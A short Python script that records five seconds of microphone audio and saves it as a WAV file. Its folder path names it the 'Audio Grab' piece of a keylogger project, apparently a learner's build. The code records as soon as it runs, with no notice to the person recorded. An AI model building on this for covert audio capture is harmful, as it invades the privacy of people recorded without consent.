# scipy allows wavfile extension to be written, import sound device allows for audio input to be recorded
from scipy.io.wavfile import write
import sounddevice as sd

file_path = "C:\\Users\\Bryce\\PycharmProjects\\Project 4 - Keylogger\\Pieces\\Audio Grab"
extend = "\\"
file_merge = file_path + extend

audio_information = 'Audio.wav'

microphone_time = 5

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()